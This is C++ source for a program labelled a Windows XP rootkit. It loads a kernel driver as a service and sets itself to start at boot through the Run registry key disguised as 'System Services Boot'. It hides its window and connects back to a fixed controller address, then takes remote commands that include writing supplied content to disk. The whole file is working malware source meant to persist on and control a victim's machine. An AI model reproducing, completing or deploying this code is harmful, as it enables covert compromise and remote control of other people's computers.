/*
 * Rootkit of Windows XP Version 0.1
 * Oct 31st 2019
 */

#include <tchar.h>
#include <WINSOCK2.h>
#include <string>
#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
#include <windows.h>
#pragma comment(lib,"WS2_32.lib")
#define BUF_SIZE  512

bool boot_auto = false;
char _g_path[100];

int _util_load_sysfile(char *theDriverName)
{
	char aPath[1024];
	char aCurrentDirectory[515];
	SC_HANDLE sh = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(!sh) {
		return false;
	}
	if (boot_auto) {
		strcpy(aCurrentDirectory, _g_path);
	} else {
	    GetCurrentDirectory(512, aCurrentDirectory);
	}
	
	_snprintf(aPath,
			1022,
			"%s\\%s.sys",
			aCurrentDirectory,
			theDriverName);
	printf("loading %s\n", aPath);

	SC_HANDLE rh = CreateService(sh,
							theDriverName,
							theDriverName,
							SERVICE_ALL_ACCESS,
							SERVICE_KERNEL_DRIVER,
							SERVICE_DEMAND_START,
							SERVICE_ERROR_NORMAL,
							aPath,
							NULL,
							NULL,
							NULL,
							NULL,
							NULL
							);

	if (!rh) {
		if (GetLastError() == ERROR_SERVICE_EXISTS) {
			// service exists
			rh = OpenService(sh,
						theDriverName,
						SERVICE_ALL_ACCESS);
			if (!rh) {
				CloseServiceHandle(sh);
				printf("Loading failed![0]\n");
				return false;
			}
		}
		else {
			CloseServiceHandle(sh);
			printf("Loading failed![1]\n");
			return false;
		}
	}
	// start the drivers
	if (rh) {
		// The number of strings in the lpServiceArgVectors array. If lpServiceArgVectors is NULL, this parameter can be zero.
		// The null-terminated strings to be passed to the ServiceMain function for the service as arguments.
		if (0 == StartService(rh, 0, NULL)) {
			if (ERROR_SERVICE_ALREADY_RUNNING == GetLastError()) {
				// no real problem
			}
			else {
				CloseServiceHandle(sh);
				CloseServiceHandle(rh);
				printf("Loading failed![2]\n");
				return false;
			}
		}
		CloseServiceHandle(sh);
		CloseServiceHandle(rh);
	}
	printf("Loading successfully!\n");
	return true;
}

bool _startup() {
	// Startup with system
	HKEY hKey = NULL;
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
	if (result != ERROR_SUCCESS) {
	    printf("Error!\n");
		return false;
	}

	// get current directory
	char *cDir = NULL;
	cDir = getcwd(NULL, 0);
	if (cDir == NULL) return false;

	char *cPath = (char *)malloc(strlen(cDir) + 20);
	if (cPath == NULL) return false;

	strcpy(cPath, cDir);
	free(cDir);
	char *pName = "\\Loader.exe";
	strcat(cPath, pName);

	// Read From Register
	char oPath[50];
	DWORD dwType = REG_SZ;
	DWORD dwLen = sizeof(oPath);
    result = RegQueryValueEx(hKey, "System Services Boot", 0, &dwType, (LPBYTE)oPath, &dwLen);
	if (result == ERROR_SUCCESS) {  // Already contains current file
		boot_auto = true;
		strcpy(_g_path, oPath);
		_g_path[strlen(_g_path) - 11] = 0;
		return true;
	} else {  // Set new value to this register item
	    result = RegSetValueEx(hKey, "System Services Boot", 0, REG_SZ, (const unsigned char *)cPath, strlen(cPath));
	}
	if (result != ERROR_SUCCESS) {
		printf("Set Error!\n");
		return false;
	}
	printf("Set Successfully!\n");
	return true;
}

int _tmain(int argc, _TCHAR* argv[])
{
	WSADATA wsd;
	SOCKET sHost;
	SOCKADDR_IN servAddr;
	char recv_buf[BUF_SIZE];
	char send_buf[BUF_SIZE];
	int retVal;

	bool status;
	char driver[] = "system_root";
	_startup();
	status = _util_load_sysfile(driver);

	HWND hWnd= GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);  // Hide current Window

	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
	{
		printf("WSAStartup failed !\n");
		return 1;
	}

	sHost = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (INVALID_SOCKET == sHost)
	{
		printf("socket failed !\n");
		WSACleanup();
		return -1;
	}

	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.S_un.S_addr = inet_addr("10.211.55.2");
	servAddr.sin_port = htons(15555);
	int sServerAddr = sizeof(servAddr);

	retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr));
	if(SOCKET_ERROR == retVal)
	{
		printf("connect failed !\n");
		closesocket(sHost);
		WSACleanup();
		return -1;
	}
	ZeroMemory(send_buf, BUF_SIZE);
	sprintf(send_buf, "BOSS, I'm in this SB's COMPUTER now, please give me command!\n");
	retVal = send(sHost, send_buf, strlen(send_buf), 0);
	if (SOCKET_ERROR == retVal)
	{
		printf("send failed !\n");
		closesocket(sHost);
		WSACleanup();
		return -1;
	}
	ZeroMemory(send_buf, BUF_SIZE);
	sprintf(send_buf, "Commands:\nr\t\tread time from computer\nw [content]\twrite content\np [s]\t\tpause for [s] second(s)\nq\t\tquit\n");
	send(sHost, send_buf, strlen(send_buf), 0);
	bool quit = false;
	while (true)
	{
		if (quit) break;
		ZeroMemory(recv_buf, BUF_SIZE);
		retVal = recv(sHost, recv_buf, sizeof(recv_buf) + 1, 0);
		if (SOCKET_ERROR == retVal)
		{
			printf("recv failed !\n");
			closesocket(sHost);
			WSACleanup();
			return -1;
		}
		printf("Recv From Server: %s\n", recv_buf);
		char command = recv_buf[0];
		switch (command) {
		case 'r': 
		{
			SYSTEMTIME st;
			GetLocalTime(&st);
			char sDateTime[30];
			sprintf(sDateTime, "%4d-%2d-%2d %2d:%2d:%2d\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);       
			ZeroMemory(send_buf, BUF_SIZE);
			strcpy(send_buf, sDateTime);
			retVal = send(sHost, send_buf, strlen(send_buf), 0);
			if (SOCKET_ERROR == retVal)
			{
				printf("send failed !\n");
				closesocket(sHost);
				WSACleanup();
				return -1;
			}
			ZeroMemory(send_buf, BUF_SIZE);
			sprintf(send_buf, "Another command, please, BOSS!\n");
			send(sHost, send_buf, strlen(send_buf), 0);
		}
			break;
		case 'w':
			{
				char *w_content = recv_buf + 2;
				std::ofstream afile;
				afile.open("C:\\content.txt");
				afile << w_content << std::endl;
				afile.close();
				ZeroMemory(send_buf, BUF_SIZE);
				sprintf(send_buf, "It's complete, BOSS!\n");
				send(sHost, send_buf, strlen(send_buf), 0);
			}
			break;
		case 'p':
			{
				char *s_seconds = recv_buf + 2;
				int seconds = atoi(s_seconds);
				ZeroMemory(send_buf, BUF_SIZE);
				sprintf(send_buf, "Thank You, BOSS! I will sleep for %d seconds!\n", seconds);
				send(sHost, send_buf, strlen(send_buf), 0);
				Sleep(seconds * 1000);
				ZeroMemory(send_buf, BUF_SIZE);
				sprintf(send_buf, "BOSS, I'm waking up, you can give me command!\n");
				send(sHost, send_buf, strlen(send_buf), 0);
			}
			break;
		case 'q':
			quit = true;
			ZeroMemory(send_buf, BUF_SIZE);
			sprintf(send_buf, "Good Bye, BOSS, I'll see you next time!\n");
			send(sHost, send_buf, strlen(send_buf), 0);
			break;
		}
	}
	closesocket(sHost);
	WSACleanup();
	system("pause");
	return 0;
}